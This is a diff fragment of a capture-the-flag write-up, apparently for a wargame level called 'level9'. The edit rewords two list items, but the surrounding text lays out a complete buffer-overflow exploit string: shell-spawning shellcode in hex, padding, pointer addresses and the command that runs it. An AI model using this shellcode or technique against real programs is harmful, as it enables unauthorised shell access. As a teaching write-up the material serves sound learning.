@@ -113,10 +113,10 @@ Searching for ```Ad6A``` in the pattern string we find it starts at byte 109. Th
 ### Build exploit string
 
 So we build our exploit which will be copied to buffer address ```0x804a00c```:
-1. address of malicious code (part 2) - ```\x10\xa0\x04\x08```
+1. address of malicious code (points to part 2) - ```\x10\xa0\x04\x08```
 2. malicious code which opens a shell - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80```
 3. buffer until we reach ```n2``` - ```"A" * 76```
-4. address of address of malicious code (part 1) - ```\x0c\xa0\04\x08```
+4. address of address of malicious code (points to part 1) - ```\x0c\xa0\04\x08```
 
 ```
 level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
